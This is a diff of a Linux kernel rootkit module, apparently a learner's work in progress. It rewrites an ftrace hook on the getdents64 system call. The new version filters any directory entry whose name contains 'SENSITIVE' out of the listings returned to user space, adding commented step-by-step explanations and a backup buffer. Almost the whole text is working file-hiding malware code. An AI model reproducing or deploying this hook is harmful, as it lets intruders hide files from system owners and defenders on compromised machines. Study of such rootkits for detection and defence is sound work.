@@ -40,63 +40,70 @@ asmlinkage int hook_kill(const struct pt_regs* regs)
 static asmlinkage long (*orig_getdents)(const struct pt_regs*);
 
 asmlinkage int hook_getdents(const struct pt_regs* regs) {
-	pr_info("start hook\n");
-	long ret;
-	unsigned long offset = 0;
-	unsigned long bytes_left;
-	struct linux_dirent64 *d, *kdirent;
-	char *dirp = (char *)regs->si;
-	pr_info("calling orig\n");
-	ret = orig_getdents(regs);
-	if (ret <= 0) {
-		pr_info("returning orig ret <= 0\n");
-		return ret;
-	}
-	
-	kdirent = kmalloc(ret, GFP_KERNEL);
-	if (!kdirent) { // TODO why returning ret here ? what does this mean that kmalloc accepts ret etc? GFP_KERNEL?
-		return ret;
-	}
-	pr_info("post kmalloc\n");
-	if (copy_from_user(kdirent, dirp, ret)) {
-		kfree(kdirent);
-		return ret;
-	}
-	
-	pr_info("post copy from user\n");
-	bytes_left = ret; // TODO what does this mean bytes left is RET?? wait what is RET? in this case? 
-	pr_info("in hook getdents");
-	while (bytes_left > 0) {
-		d = (struct linux_dirent64 *)((char *)kdirent + offset);
-		if (strstr(d->d_name, "SENSITIVE")) {
-			pr_info("name matches");
-			memmove(d, (char *)d + d->d_reclen, bytes_left - d->d_reclen);
-			ret -= d->d_reclen;
-			bytes_left -= d->d_reclen;
-			continue; // TODO check the memmove in this case
-		}
-		else pr_info("not the desired one %so\n", (void*)d->d_name);
+        long ret; // will represent the amount of bytes to process, set by the getdents call
+        unsigned long offset = 0;
+        unsigned long bytes_left;
+        struct linux_dirent64 *d, *kdirent, *kdirent_orig; // kdirent_orig is in case something fails
+	char *dirp = (char *)regs->si; // will hold the results of the getdents call
+        ret = orig_getdents(regs);
+	pr_info("sdfsdf\n");
+	long orig_ret = ret; // in case something fails
+        if (ret <= 0) {
+                return ret;
+        }
 
-		offset += d->d_reclen;
-		bytes_left -= d->d_reclen;
-	}
-	pr_info("before copy\n");
+        kdirent = kmalloc(ret, GFP_KERNEL); // allocate memory on kernel
+        if (!kdirent) {
+                return ret;
+        }
 
-	if (copy_to_user(dirp, kdirent, ret)) {
-		pr_info("calling free");
-		kfree(kdirent);
+	kdirent_orig = kmalloc(ret, GFP_KERNEL);  // CHANGED: new backup allocation
+    	if (!kdirent_orig) {
+        	kfree(kdirent);
+        	return ret;
+    	}
+
+
+        if (copy_from_user(kdirent, dirp, ret)) { // copy original results into the kernel buffer
+                kfree(kdirent);
+                kfree(kdirent_orig);
 		return ret;
-	}
-	pr_info("before kfree\n");
+        }
+	pr_info("sdfsdf\n");
+	memcpy(kdirent_orig, kdirent, ret);
 
-	kfree(kdirent);
-	return ret;
+        bytes_left = ret; 
+        while (bytes_left > 0) {
+                d = (struct linux_dirent64 *)((char *)kdirent + offset); // get next entry
+                if (strstr(d->d_name, "SENSITIVE")) {
+                        size_t tmp = d->d_reclen; // store as tmp otherwise it will be overwritten by next entry after memmove
+                        memmove(d, (char *)d + tmp, bytes_left - tmp); // move next entries backwards to overwrite the hidden entry
+                        ret -= tmp; // reduce bytes to read (to return)
+                        bytes_left -= tmp; // reduce bytes to read in this loop
+                        continue; // do no update offset, as next iteration will use the same offset where the new memory was placed
+                }
+
+                offset += d->d_reclen;
+                bytes_left -= d->d_reclen;
+
+        }
+
+        if (copy_to_user(dirp, kdirent, ret)) { // copy the filtered result + new 'ret' val into user space
+		copy_to_user(dirp, kdirent_orig, ret); // restore original if copying modified fails
+		kfree(kdirent_orig);
+                kfree(kdirent);
+                return ret;
+        }
+
+        kfree(kdirent_orig);
+        kfree(kdirent);
+        return ret; // return new size
 }
 
 // define which functions to hook
 static struct ftrace_hook hooks[] = {
  //   HOOK("__x64_sys_kill", hook_kill, &orig_kill),
-	HOOK("__x64_sys_getdents64", hook_getdents, &orig_getdents),
+        HOOK("__x64_sys_getdents64", hook_getdents, &orig_getdents),
 };
 
 static int __init rootkit_init(void) {
